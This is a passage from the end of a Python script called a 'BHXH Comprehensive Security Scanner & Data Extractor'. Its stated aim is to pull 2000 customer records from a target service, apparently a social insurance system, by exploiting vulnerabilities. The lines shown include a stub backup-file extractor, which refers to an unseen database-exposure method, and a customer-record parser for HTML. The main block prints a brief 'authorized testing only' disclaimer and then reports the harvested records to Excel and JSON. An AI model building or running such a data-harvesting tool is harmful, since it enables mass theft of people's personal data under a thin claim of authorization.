    def extract_via_backup_files(self):
        """Extract data from backup files"""
        # Already implemented in extract_via_database_exposure
        return 0

    def extract_customer_info_from_html(self, html_content):
        """Extract customer info from HTML content"""
        customer_records = self.parse_customer_data_from_response(html_content)
        return customer_records[0] if customer_records else None

if __name__ == "__main__":
    print("🔍 BHXH Comprehensive Security Scanner & Data Extractor")
    print("=" * 60)
    print("⚠️  WARNING: This tool is for authorized security testing only")
    print("🎯 Target: 2000 customer records for vulnerability assessment")
    print("=" * 60)
    
    scanner = ComprehensiveSecurityScanner()
    result = scanner.run_comprehensive_scan()
    
    if result["success"]:
        print(f"\n✅ Scan completed successfully!")
        print(f"📊 Summary:")
        print(f"   • Vulnerabilities: {result['vulnerabilities']}")
        print(f"   • Customer Records: {result['customer_records']}")
        print(f"   • Duration: {result['duration']:.2f}s")
        print(f"   • Reports: {result['excel_report']}, {result['json_report']}")
    else:
        print(f"\n❌ Scan failed: {result['error']}")
